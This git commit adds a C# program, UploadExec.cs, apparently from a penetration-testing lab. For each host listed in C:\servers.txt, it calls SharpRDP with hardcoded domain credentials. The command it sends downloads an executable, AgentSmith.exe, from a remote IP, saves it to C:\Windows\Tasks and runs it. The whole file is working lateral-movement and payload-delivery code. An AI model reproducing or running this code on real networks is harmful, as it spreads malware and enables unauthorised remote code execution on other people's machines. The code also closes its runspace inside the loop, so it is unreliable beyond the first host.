782c7b3810ab714e53048441ccfc42c637c23747
Eric Van Zutphen <ericv_37@hotmail.com>
2021-07-05 08:13:15 -0400

    Create UploadExec.cs

---
+++ UploadExec.cs
@@ -0,0 +1,34 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.IO;
+
+
+namespace UploadExec
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            string[] lines = System.IO.File.ReadAllLines(@"C:\servers.txt");
+
+            foreach (string line in lines)
+            {
+                String cmd = "SharpRDP.exe computername=" + line + "command='powershell(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.79/AgentSmith.exe', 'C:\\Windows\\Tasks\\AgentSmith.exe'); C:\\Windows\\Tasks\\AgentSmith.exe' username=corp1\\dave password=lab";
+                Console.WriteLine(cmd);
+                ps.AddScript(cmd);
+                ps.Invoke();
+                rs.Close();
+            }
+        }
+    }
+}
